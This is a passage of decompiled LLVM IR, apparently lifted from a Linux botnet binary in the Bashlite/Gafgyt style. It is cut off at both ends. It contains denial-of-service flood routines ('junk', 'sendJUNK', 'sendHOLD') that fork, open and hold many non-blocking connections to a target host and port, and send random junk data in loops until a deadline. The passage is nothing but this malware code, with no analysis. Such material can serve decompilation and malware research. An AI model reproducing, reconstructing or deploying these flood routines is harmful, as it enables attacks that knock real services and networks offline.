  %v5_80500ec = call i32 @__libc_select(i32 %v0_80500ec, i32 10000, i32 %v2_80500ec, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80500ec, i32* %eax.global-to-local, align 4
  %v0_80500f1 = load i32, i32* @esp, align 4
  %v12_80500f7 = icmp eq i32 %v5_80500ec, 1
  %v1_80500fb = icmp eq i1 %v12_80500f7, false
  br i1 %v1_80500fb, label %dec_label_pc_805016d, label %dec_label_pc_80500fd

dec_label_pc_80500fd:                             ; preds = %dec_label_pc_805007b
  store i32 4, i32* %stack_var_-204, align 4
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff10, i32* %eax.global-to-local, align 4
  %v5_805010d = load i32, i32* %v4_805009a, align 8
  store i32 %v5_805010d, i32* %edx.global-to-local, align 4
  %v2_8050119 = add i32 %v0_80500f1, 16
  %v3_8050119 = inttoptr i32 %v2_8050119 to i32*
  store i32 %v2_8050113, i32* %v3_8050119, align 4
  store i32 %v2_805011a, i32* %eax.global-to-local, align 4
  %v2_8050120 = add i32 %v0_80500f1, 12
  %v3_8050120 = inttoptr i32 %v2_8050120 to i32*
  store i32 %v2_805011a, i32* %v3_8050120, align 4
  %v1_8050121 = add i32 %v0_80500f1, 8
  %v2_8050121 = inttoptr i32 %v1_8050121 to i32*
  store i32 4, i32* %v2_8050121, align 4
  %v1_8050123 = add i32 %v0_80500f1, 4
  %v2_8050123 = inttoptr i32 %v1_8050123 to i32*
  store i32 1, i32* %v2_8050123, align 4
  %v0_8050125 = load i32, i32* %edx.global-to-local, align 4
  %v3_8050125 = inttoptr i32 %v0_80500f1 to i32*
  store i32 %v0_8050125, i32* %v3_8050125, align 4
  %v0_8050126 = load i32, i32* %stack_var_-204, align 4
  %v1_8050126 = call i32 @getsockopt(i32 %v0_8050126)
  %v0_805012b = load i32, i32* @esp, align 4
  %v3_805012e = load i32, i32* %stack_var_-208, align 4
  %v1_8050134 = icmp eq i32 %v3_805012e, 0
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff10, i32* %eax.global-to-local, align 4
  br i1 %v1_8050134, label %dec_label_pc_805015d, label %dec_label_pc_8050138

dec_label_pc_8050138:                             ; preds = %dec_label_pc_80500fd
  %v5_805013e = load i32, i32* %v4_805009a, align 8
  store i32 %v5_805013e, i32* %eax.global-to-local, align 4
  %v2_8050144 = add i32 %v0_805012b, 16
  %v3_8050144 = inttoptr i32 %v2_8050144 to i32*
  store i32 %v5_805013e, i32* %v3_8050144, align 4
  %v0_8050145 = load i32, i32* %stack_var_-204, align 4
  %v1_8050145 = call i32 @close(i32 %v0_8050145)
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff10, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804ff9a, align 4
  br label %dec_label_pc_805020e

dec_label_pc_805015d:                             ; preds = %dec_label_pc_80500fd
  store i8 2, i8* %v5_804ff9a, align 4
  br label %dec_label_pc_805020e

dec_label_pc_805016d:                             ; preds = %dec_label_pc_805007b
  %v13_805016d = icmp eq i32 %v5_80500ec, -1
  %v1_8050171 = icmp eq i1 %v13_805016d, false
  br i1 %v1_8050171, label %dec_label_pc_805020e, label %dec_label_pc_8050177

dec_label_pc_8050177:                             ; preds = %dec_label_pc_805016d
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff10, i32* %eax.global-to-local, align 4
  %v5_805017d = load i32, i32* %v4_805009a, align 8
  store i32 %v5_805017d, i32* %eax.global-to-local, align 4
  %v2_8050183 = add i32 %v0_80500f1, 16
  %v3_8050183 = inttoptr i32 %v2_8050183 to i32*
  store i32 %v5_805017d, i32* %v3_8050183, align 4
  %v1_8050184 = call i32 @close(i32 %v5_80500ec)
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff10, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804ff9a, align 4
  br label %dec_label_pc_805020e

dec_label_pc_8050199:                             ; preds = %dec_label_pc_804ffb8
  %v0_8050199 = load i32, i32* @esp, align 4
  %v1_805019c = add i32 %v0_8050199, -12
  %v2_805019c = inttoptr i32 %v1_805019c to i32*
  store i32 8192, i32* %v2_805019c, align 4
  %v1_80501a1 = add i32 %v0_8050199, -16
  %v2_80501a1 = inttoptr i32 %v1_80501a1 to i32*
  store i32 32, i32* %v2_80501a1, align 4
  %v2_80501a3 = call i32 @realrand(i32 %v7_804ff9a, i32 %v12_804fe7a)
  store i32 %v2_80501a3, i32* %eax.global-to-local, align 4
  %v0_80501a8 = load i32, i32* @esp, align 4
  %v5_80501b1 = add i32 %v0_80501a8, 4
  %v6_80501b1 = inttoptr i32 %v5_80501b1 to i32*
  store i32 %v2_80501a3, i32* %v6_80501b1, align 4
  %v6_80501b4 = inttoptr i32 %v0_80501a8 to i32*
  store i32 %v1_804ff49, i32* %v6_80501b4, align 4
  %v1_80501b7 = inttoptr i32 %v2_80501a3 to i8*
  %v2_80501b7 = call i32 @makeRandomShit(i8* %v1_80501b7)
  %v0_80501bc = load i32, i32* @esp, align 4
  store i32 %v2_80501a3, i32* @ecx, align 4
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff10, i32* %eax.global-to-local, align 4
  %v3_80501c8 = add i32 %v2_804ff9a, %v2_804ff10
  %v4_80501c8 = inttoptr i32 %v3_80501c8 to i32*
  %v5_80501c8 = load i32, i32* %v4_80501c8, align 8
  store i32 %v5_80501c8, i32* %eax.global-to-local, align 4
  %v1_80501cb = add i32 %v0_80501bc, 12
  %v2_80501cb = inttoptr i32 %v1_80501cb to i32*
  store i32 16384, i32* %v2_80501cb, align 4
  %v0_80501d0 = load i32, i32* @ecx, align 4
  %v2_80501d0 = add i32 %v0_80501bc, 8
  %v3_80501d0 = inttoptr i32 %v2_80501d0 to i32*
  store i32 %v0_80501d0, i32* %v3_80501d0, align 4
  %v5_80501d1 = add i32 %v0_80501bc, 4
  %v6_80501d1 = inttoptr i32 %v5_80501d1 to i32*
  store i32 %v1_804ff49, i32* %v6_80501d1, align 4
  %v0_80501d4 = load i32, i32* %eax.global-to-local, align 4
  %v3_80501d4 = inttoptr i32 %v0_80501bc to i32*
  store i32 %v0_80501d4, i32* %v3_80501d4, align 4
  %v4_80501d5 = call i32 @send(i32 %v2_80501a3, i32 %v5_804ff7d, i32 %stack_var_-20.145, i32 %stack_var_-16.144)
  store i32 %v4_80501d5, i32* %eax.global-to-local, align 4
  %v10_80501dd = icmp eq i32 %v4_80501d5, -1
  %v1_80501e0 = icmp eq i1 %v10_80501dd, false
  br i1 %v1_80501e0, label %dec_label_pc_805020e, label %dec_label_pc_80501e2

dec_label_pc_80501e2:                             ; preds = %dec_label_pc_8050199
  %v1_80501e2 = call i32 @__errno_location(i32 %v2_80501a3)
  store i32 %v1_80501e2, i32* %eax.global-to-local, align 4
  %v1_80501e7 = inttoptr i32 %v1_80501e2 to i32*
  %v2_80501e7 = load i32, i32* %v1_80501e7, align 4
  store i32 %v2_80501e7, i32* %eax.global-to-local, align 4
  %v9_80501e9 = icmp eq i32 %v2_80501e7, 11
  br i1 %v9_80501e9, label %dec_label_pc_805020e, label %dec_label_pc_80501ee

dec_label_pc_80501ee:                             ; preds = %dec_label_pc_80501e2
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff10, i32* %eax.global-to-local, align 4
  %v5_80501f4 = load i32, i32* %v4_80501c8, align 8
  store i32 %v5_80501f4, i32* %eax.global-to-local, align 4
  %v0_80501f7 = load i32, i32* @esp, align 4
  %v2_80501fa = add i32 %v0_80501f7, -16
  %v3_80501fa = inttoptr i32 %v2_80501fa to i32*
  store i32 %v5_80501f4, i32* %v3_80501fa, align 4
  %v1_80501fb = call i32 @close(i32 %v2_80501a3)
  store i32 %storemerge46, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff10, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804ff9a, align 4
  br label %dec_label_pc_805020e

dec_label_pc_805020e:                             ; preds = %dec_label_pc_804ffc5, %dec_label_pc_80501e2, %dec_label_pc_8050199, %dec_label_pc_805016d, %dec_label_pc_8050177, %dec_label_pc_805015d, %dec_label_pc_8050138, %dec_label_pc_805006b, %dec_label_pc_8050051, %dec_label_pc_80501ee
  %stack_var_-16.0 = phi i32 [ %v2_8050085, %dec_label_pc_805016d ], [ %v2_8050085, %dec_label_pc_8050177 ], [ %v2_8050085, %dec_label_pc_805015d ], [ %v2_8050085, %dec_label_pc_8050138 ], [ %stack_var_-16.144, %dec_label_pc_8050199 ], [ %stack_var_-16.144, %dec_label_pc_80501e2 ], [ %stack_var_-16.144, %dec_label_pc_80501ee ], [ %stack_var_-16.144, %dec_label_pc_8050051 ], [ %stack_var_-16.144, %dec_label_pc_805006b ], [ %stack_var_-16.144, %dec_label_pc_804ffc5 ]
  %stack_var_-20.0 = phi i32 [ %v6_805008c, %dec_label_pc_805016d ], [ %v6_805008c, %dec_label_pc_8050177 ], [ %v6_805008c, %dec_label_pc_805015d ], [ %v6_805008c, %dec_label_pc_8050138 ], [ %stack_var_-20.145, %dec_label_pc_8050199 ], [ %stack_var_-20.145, %dec_label_pc_80501e2 ], [ %stack_var_-20.145, %dec_label_pc_80501ee ], [ %stack_var_-20.145, %dec_label_pc_8050051 ], [ %stack_var_-20.145, %dec_label_pc_805006b ], [ %stack_var_-20.145, %dec_label_pc_804ffc5 ]
  %v4_805020e = add nuw nsw i32 %storemerge46, 1
  store i32 %v4_805020e, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_805020e, %v2_804fe96
  br i1 %exitcond, label %dec_label_pc_8050211.dec_label_pc_805021d.loopexit_crit_edge, label %dec_label_pc_804ff94

dec_label_pc_8050211.dec_label_pc_805021d.loopexit_crit_edge: ; preds = %dec_label_pc_805020e
  %v0_805021d.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805021d

dec_label_pc_805021d:                             ; preds = %dec_label_pc_8050211.preheader, %dec_label_pc_8050211.dec_label_pc_805021d.loopexit_crit_edge, %dec_label_pc_804fed7
  %v0_805021d = phi i32 [ %v1_804ff7a, %dec_label_pc_804fed7 ], [ %v0_805021d.pre.pre, %dec_label_pc_8050211.dec_label_pc_805021d.loopexit_crit_edge ], [ %v1_8050227, %dec_label_pc_8050211.preheader ]
  %stack_var_-16.2 = phi i32 [ %tmp5, %dec_label_pc_804fed7 ], [ %stack_var_-16.0, %dec_label_pc_8050211.dec_label_pc_805021d.loopexit_crit_edge ], [ %stack_var_-16.2, %dec_label_pc_8050211.preheader ]
  %stack_var_-20.2 = phi i32 [ %tmp6, %dec_label_pc_804fed7 ], [ %stack_var_-20.0, %dec_label_pc_8050211.dec_label_pc_805021d.loopexit_crit_edge ], [ %stack_var_-20.2, %dec_label_pc_8050211.preheader ]
  %stack_var_-40.0 = phi i32 [ %tmp8, %dec_label_pc_804fed7 ], [ %v2_804fe96, %dec_label_pc_8050211.dec_label_pc_805021d.loopexit_crit_edge ], [ 0, %dec_label_pc_8050211.preheader ]
  %v1_8050220 = add i32 %v0_805021d, -16
  %v2_8050220 = inttoptr i32 %v1_8050220 to i32*
  store i32 0, i32* %v2_8050220, align 4
  %v1_8050222 = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_8050222 = call i32 @__GI_time(i32* %v1_8050222)
  store i32 %v2_8050222, i32* %eax.global-to-local, align 4
  %v5_805022d = icmp slt i32 %v2_8050222, %v5_804ff7d
  br i1 %v5_805022d, label %dec_label_pc_8050211.preheader, label %dec_label_pc_8050233

dec_label_pc_8050211.preheader:                   ; preds = %dec_label_pc_805021d
  %v0_8050227 = load i32, i32* @esp, align 4
  %v1_8050227 = add i32 %v0_8050227, 16
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_805021743, label %dec_label_pc_804ff94, label %dec_label_pc_805021d

dec_label_pc_8050233:                             ; preds = %dec_label_pc_805021d, %entry
  %v0_805023f = phi i32 [ %v3_804fec6, %entry ], [ %v2_8050222, %dec_label_pc_805021d ]
  ret i32 %v0_805023f

; uselistorder directives
  uselistorder i32 %v4_805020e, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v0_80501bc, { 3, 0, 1, 2 }
  uselistorder i32 %v0_80500f1, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v5_80500ec, { 2, 0, 1, 3 }
  uselistorder i32 %v1_80500ab, { 1, 0 }
  uselistorder i32* %v4_805009a, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v12_805000a, { 1, 0 }
  uselistorder i32 %v0_8050005, { 2, 0, 1 }
  uselistorder i32 %v7_804ff9a, { 7, 2, 1, 3, 4, 5, 6, 8, 0 }
  uselistorder i8* %v5_804ff9a, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %stack_var_-16.144, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-20.145, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %storemerge46, { 5, 13, 12, 11, 7, 6, 10, 9, 8, 4, 3, 2, 19, 18, 17, 16, 15, 14, 20, 0, 1 }
  uselistorder i32 %v5_804ff7d, { 1, 0, 2 }
  uselistorder i32 %v2_804ff2d, { 1, 0 }
  uselistorder i32 %v2_804ff10, { 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 23, 22, 21, 20, 2, 19, 3, 7, 24, 6, 5, 4 }
  uselistorder i32 %v2_804feff, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804fea4, { 1, 0 }
  uselistorder i32 %v2_804fe96, { 3, 2, 0, 1 }
  uselistorder i32 %v1_804fe88, { 1, 0, 2 }
  uselistorder i32 %v12_804fe7a, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 0, 2 }
  uselistorder i32* %stack_var_-204, { 1, 0, 2, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %eax.global-to-local, { 0, 45, 44, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 14, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder label %dec_label_pc_805020e, { 9, 1, 2, 4, 3, 5, 6, 7, 8, 0 }
}

define i32 @junk(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_805024b = icmp sgt i32 %arg3, 2
  br i1 %v7_805024b, label %dec_label_pc_805024d, label %entry.dec_label_pc_8050265_crit_edge

entry.dec_label_pc_8050265_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8050265

dec_label_pc_805024d:                             ; preds = %entry
  %v1_8050250 = add i32 %arg4, 12
  %v1_8050253 = inttoptr i32 %v1_8050250 to i32*
  %v2_8050253 = load i32, i32* %v1_8050253, align 4
  %v1_8050259 = call i32 @atol(i32 %v2_8050253)
  store i32 %v1_8050259, i32* @eax, align 4
  %v2_8050261 = icmp slt i32 %v1_8050259, 0
  %v1_8050263 = icmp eq i1 %v2_8050261, false
  br i1 %v1_8050263, label %dec_label_pc_805027d, label %dec_label_pc_8050265

dec_label_pc_8050265:                             ; preds = %entry.dec_label_pc_8050265_crit_edge, %dec_label_pc_805024d
  %v3_8050273 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_806a1a0.258 to i32))
  br label %dec_label_pc_80502f9

dec_label_pc_805027d:                             ; preds = %dec_label_pc_805024d
  %v1_8050283 = call i32 @mfork(i32 %arg2)
  %v1_805028b = icmp eq i32 %v1_8050283, 0
  %v1_805028d = icmp eq i1 %v1_805028b, false
  br i1 %v1_805028d, label %dec_label_pc_80502f9, label %dec_label_pc_805028f

dec_label_pc_805028f:                             ; preds = %dec_label_pc_805027d
  %v1_8050292 = add i32 %arg4, 8
  %v1_8050295 = inttoptr i32 %v1_8050292 to i32*
  %v1_805029a = add i32 %arg4, 4
  %v1_805029d = inttoptr i32 %v1_805029a to i32*
  %v3_80502af = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_806a1c4.259 to i32))
  %v2_80502bd = load i32, i32* %v1_8050253, align 4
  %v1_80502c3 = call i32 @atol(i32 %v2_80502bd)
  store i32 %v1_80502c3, i32* @ebx, align 4
  %v2_80502d3 = load i32, i32* %v1_8050295, align 4
  %v1_80502d9 = call i32 @atol(i32 %v2_80502d3)
  %v2_80502e9 = load i32, i32* %v1_805029d, align 4
  %v0_80502ee = load i32, i32* @ebx, align 4
  %v4_80502f1 = call i32 @sendJUNK(i32 %v2_80502e9, i32 %v1_80502d9, i32 %v0_80502ee)
  br label %dec_label_pc_80502f9

dec_label_pc_80502f9:                             ; preds = %dec_label_pc_805027d, %dec_label_pc_8050265, %dec_label_pc_805028f
  %v0_80502fd = phi i32 [ %v1_8050283, %dec_label_pc_805027d ], [ %v3_8050273, %dec_label_pc_8050265 ], [ %v4_80502f1, %dec_label_pc_805028f ]
  ret i32 %v0_80502fd

; uselistorder directives
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80502f9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050265, { 1, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v12_8050303 = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v12_8050303, i32* %eax.global-to-local, align 4
  %v1_8050311 = call i32 @getdtablesize(i32 %v12_8050303)
  store i32 %v1_8050311, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_8050311, 0
  %v2_805031a = zext i1 %tmp to i32
  %v2_805031d = add i32 %v2_805031a, %v1_8050311
  %v2_805031f = sdiv i32 %v2_805031d, 2
  store i32 2, i32* %stack_var_-64, align 4
  %v1_805032d = urem i32 %arg2, 65536
  store i32 %v1_805032d, i32* %eax.global-to-local, align 4
  %v1_8050336 = call i32 @htons(i32 %v1_805032d)
  %v2_8050345 = ptrtoint i32* %stack_var_-64 to i32
  %v15_8050348 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v15_8050348, i32* %eax.global-to-local, align 4
  %v3_805034f = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_805034f, i32* %eax.global-to-local, align 4
  %v1_8050357 = icmp eq i32 %v3_805034f, 0
  br i1 %v1_8050357, label %dec_label_pc_8050360, label %dec_label_pc_80506bd

dec_label_pc_8050360:                             ; preds = %entry
  %v15_805036a = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_805036a, i32* %eax.global-to-local, align 4
  %v3_805036e = bitcast i32* %stack_var_-56 to i8*
  %v4_805036e = call i32 @__GI_memset(i8* %v3_805036e, i32 0, i32 8)
  %v2_8050379 = mul i32 %v2_805031f, 8
  %v1_805037f = add i32 %v2_8050379, 30
  %v2_8050382 = and i32 %v1_805037f, -16
  %v2_8050388 = sub i32 %v12_8050303, %v2_8050382
  %v1_8050396 = add i32 %v2_8050388, 15
  %v2_8050399 = and i32 %v1_8050396, -16
  %v2_80503b6 = mul i32 %v2_805031f, 5
  store i32 %v2_80503b6, i32* %eax.global-to-local, align 4
  store i32 %v2_8050399, i32* %edx.global-to-local, align 4
  %v2_80503be = add i32 %v2_8050388, -8
  %v3_80503be = inttoptr i32 %v2_80503be to i32*
  store i32 %v2_80503b6, i32* %v3_80503be, align 4
  %v1_80503bf = add i32 %v2_8050388, -12
  %v2_80503bf = inttoptr i32 %v1_80503bf to i32*
  store i32 0, i32* %v2_80503bf, align 4
  %v0_80503c1 = load i32, i32* %edx.global-to-local, align 4
  %v2_80503c1 = add i32 %v2_8050388, -16
  %v3_80503c1 = inttoptr i32 %v2_80503c1 to i32*
  store i32 %v0_80503c1, i32* %v3_80503c1, align 4
  %v3_80503c2 = inttoptr i32 %v2_8050399 to i8*
  %v4_80503c2 = call i32 @__GI_memset(i8* %v3_80503c2, i32 %tmp9, i32 %v12_8050303)
  store i32 %v4_80503c2, i32* %eax.global-to-local, align 4
  %v0_80503c7 = load i32, i32* @esp, align 4
  %v2_80503cd = inttoptr i32 %v0_80503c7 to i32*
  store i32 0, i32* %v2_80503cd, align 4
  %v1_80503cf = inttoptr i32 %v2_8050399 to i32*
  %v2_80503cf = call i32 @__GI_time(i32* %v1_80503cf)
  %v0_80503d4 = load i32, i32* @esp, align 4
  %v1_80503d4 = add i32 %v0_80503d4, 16
  %v5_80503d7 = add i32 %v2_80503cf, %arg3
  store i32 %v5_80503d7, i32* %eax.global-to-local, align 4
  %v3_80503f4 = or i32 %v2_8050399, 4
  %v2_80504df = ptrtoint i32* %stack_var_-192 to i32
  %tmp36 = bitcast i32* %stack_var_-192 to i8*
  %v2_8050533 = ptrtoint i32* %stack_var_-200 to i32
  %v2_805056d = ptrtoint i32* %stack_var_-204 to i32
  %v2_8050574 = ptrtoint i32* %stack_var_-208 to i32
  %v5_80506a143 = icmp sgt i32 %v2_805031d, 1
  br label %dec_label_pc_80506a7

dec_label_pc_80503ee:                             ; preds = %dec_label_pc_805069b.preheader, %dec_label_pc_8050698
  %storemerge44 = phi i32 [ %v4_8050698, %dec_label_pc_8050698 ], [ 0, %dec_label_pc_805069b.preheader ]
  store i32 %storemerge44, i32* %eax.global-to-local, align 4
  store i32 %v2_8050399, i32* %edx.global-to-local, align 4
  %v2_80503f4 = mul i32 %storemerge44, 8
  %v4_80503f4 = add i32 %v2_80503f4, %v3_80503f4
  %v5_80503f4 = inttoptr i32 %v4_80503f4 to i8*
  %v6_80503f4 = load i8, i8* %v5_80503f4, align 4
  %v7_80503f4 = zext i8 %v6_80503f4 to i32
  %v9_80503f4 = and i32 %storemerge44, -256
  %v10_80503f4 = or i32 %v7_80503f4, %v9_80503f4
  store i32 %v10_80503f4, i32* %eax.global-to-local, align 4
  store i32 %v7_80503f4, i32* %edx.global-to-local, align 4
  %v8_8050405 = icmp eq i8 %v6_80503f4, 0
  %v12_8050405 = icmp eq i8 %v6_80503f4, 1
  br i1 %v12_8050405, label %dec_label_pc_80504d5, label %dec_label_pc_8050412

dec_label_pc_8050412:                             ; preds = %dec_label_pc_80503ee
  %v12_8050412 = icmp eq i8 %v6_80503f4, 2
  br i1 %v12_8050412, label %dec_label_pc_80505f6, label %dec_label_pc_805041f

dec_label_pc_805041f:                             ; preds = %dec_label_pc_8050412
  br i1 %v8_8050405, label %dec_label_pc_805042d, label %dec_label_pc_8050698

dec_label_pc_805042d:                             ; preds = %dec_label_pc_805041f
  store i32 %storemerge44, i32* @ebx, align 4
  %v0_8050430 = load i32, i32* @esp, align 4
  %v1_8050433 = add i32 %v0_8050430, -8
  %v2_8050433 = inttoptr i32 %v1_8050433 to i32*
  store i32 0, i32* %v2_8050433, align 4
  %v1_8050435 = add i32 %v0_8050430, -12
  %v2_8050435 = inttoptr i32 %v1_8050435 to i32*
  store i32 1, i32* %v2_8050435, align 4
  %v1_8050437 = add i32 %v0_8050430, -16
  %v2_8050437 = inttoptr i32 %v1_8050437 to i32*
  store i32 2, i32* %v2_8050437, align 4
  %v3_8050439 = call i32 @socket(i32 %v7_80503f4, i32 %v12_8050303, i32 ptrtoint (i32* @0 to i32))
  %v2_8050446 = load i32, i32* @ebx, align 4
  %v3_8050446 = mul i32 %v2_8050446, 8
  %v4_8050446 = add i32 %v3_8050446, %v2_8050399
  %v5_8050446 = inttoptr i32 %v4_8050446 to i32*
  store i32 %v3_8050439, i32* %v5_8050446, align 8
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  %v3_805044f = add i32 %v2_80503f4, %v2_8050399
  %v4_805044f = inttoptr i32 %v3_805044f to i32*
  %v5_805044f = load i32, i32* %v4_805044f, align 8
  store i32 %v5_805044f, i32* %eax.global-to-local, align 4
  %v0_8050452 = load i32, i32* @esp, align 4
  %v1_8050455 = add i32 %v0_8050452, -8
  %v2_8050455 = inttoptr i32 %v1_8050455 to i32*
  store i32 0, i32* %v2_8050455, align 4
  %v1_8050457 = add i32 %v0_8050452, -12
  %v2_8050457 = inttoptr i32 %v1_8050457 to i32*
  store i32 3, i32* %v2_8050457, align 4
  %v0_8050459 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050459 = add i32 %v0_8050452, -16
  %v3_8050459 = inttoptr i32 %v2_8050459 to i32*
  store i32 %v0_8050459, i32* %v3_8050459, align 4
  %v1_805045a = call i32 @fcntl(i32 %v7_80503f4)
  %v0_805045f = load i32, i32* @esp, align 4
  %v12_8050464 = or i32 %v1_805045a, 2048
  store i32 %v12_8050464, i32* @ecx, align 4
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  %v5_805046d = load i32, i32* %v4_805044f, align 8
  store i32 %v5_805046d, i32* %eax.global-to-local, align 4
  %v2_8050473 = add i32 %v0_805045f, 8
  %v3_8050473 = inttoptr i32 %v2_8050473 to i32*
  store i32 %v12_8050464, i32* %v3_8050473, align 4
  %v1_8050474 = add i32 %v0_805045f, 4
  %v2_8050474 = inttoptr i32 %v1_8050474 to i32*
  store i32 4, i32* %v2_8050474, align 4
  %v0_8050476 = load i32, i32* %eax.global-to-local, align 4
  %v3_8050476 = inttoptr i32 %v0_805045f to i32*
  store i32 %v0_8050476, i32* %v3_8050476, align 4
  %v1_8050477 = call i32 @fcntl(i32 %v7_80503f4)
  %v0_805047c = load i32, i32* @esp, align 4
  store i32 %v2_8050345, i32* @ecx, align 4
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  %v5_8050488 = load i32, i32* %v4_805044f, align 8
  store i32 %v5_8050488, i32* %eax.global-to-local, align 4
  %v1_805048e = add i32 %v0_805047c, 8
  %v2_805048e = inttoptr i32 %v1_805048e to i32*
  store i32 16, i32* %v2_805048e, align 4
  %v2_8050490 = add i32 %v0_805047c, 4
  %v3_8050490 = inttoptr i32 %v2_8050490 to i32*
  store i32 %v2_8050345, i32* %v3_8050490, align 4
  %v0_8050491 = load i32, i32* %eax.global-to-local, align 4
  %v3_8050491 = inttoptr i32 %v0_805047c to i32*
  store i32 %v0_8050491, i32* %v3_8050491, align 4
  %v3_8050492 = call i32 @connect(i32 %v7_80503f4, i32 %v12_8050303, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8050492, i32* %eax.global-to-local, align 4
  %v0_8050497 = load i32, i32* @esp, align 4
  %v1_8050497 = add i32 %v0_8050497, 16
  %v10_805049a = icmp eq i32 %v3_8050492, -1
  %v1_805049d = icmp eq i1 %v10_805049a, false
  br i1 %v1_805049d, label %dec_label_pc_80504ab, label %dec_label_pc_805049f

dec_label_pc_805049f:                             ; preds = %dec_label_pc_805042d
  %v1_805049f = call i32 @__errno_location(i32 %v7_80503f4)
  store i32 %v1_805049f, i32* %eax.global-to-local, align 4
  %v1_80504a4 = inttoptr i32 %v1_805049f to i32*
  %v2_80504a4 = load i32, i32* %v1_80504a4, align 4
  store i32 %v2_80504a4, i32* %eax.global-to-local, align 4
  %v9_80504a6 = icmp eq i32 %v2_80504a4, 115
  br i1 %v9_80504a6, label %dec_label_pc_80504c5, label %dec_label_pc_805049f.dec_label_pc_80504ab_crit_edge

dec_label_pc_805049f.dec_label_pc_80504ab_crit_edge: ; preds = %dec_label_pc_805049f
  %v0_80504b4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80504ab

dec_label_pc_80504ab:                             ; preds = %dec_label_pc_805049f.dec_label_pc_80504ab_crit_edge, %dec_label_pc_805042d
  %v0_80504b4 = phi i32 [ %v0_80504b4.pre, %dec_label_pc_805049f.dec_label_pc_80504ab_crit_edge ], [ %v1_8050497, %dec_label_pc_805042d ]
  store i32 %storemerge44, i32* %eax.global-to-local, align 4
  store i32 %v2_8050399, i32* %edx.global-to-local, align 4
  %v5_80504b1 = load i32, i32* %v4_805044f, align 8
  store i32 %v5_80504b1, i32* %eax.global-to-local, align 4
  %v2_80504b7 = add i32 %v0_80504b4, -16
  %v3_80504b7 = inttoptr i32 %v2_80504b7 to i32*
  store i32 %v5_80504b1, i32* %v3_80504b7, align 4
  %v1_80504b8 = call i32 @close(i32 %v7_80503f4)
  store i32 %v1_80504b8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050698

dec_label_pc_80504c5:                             ; preds = %dec_label_pc_805049f
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_80503f4, align 4
  br label %dec_label_pc_8050698

dec_label_pc_80504d5:                             ; preds = %dec_label_pc_80503ee
  store i32 0, i32* %eax.global-to-local, align 4
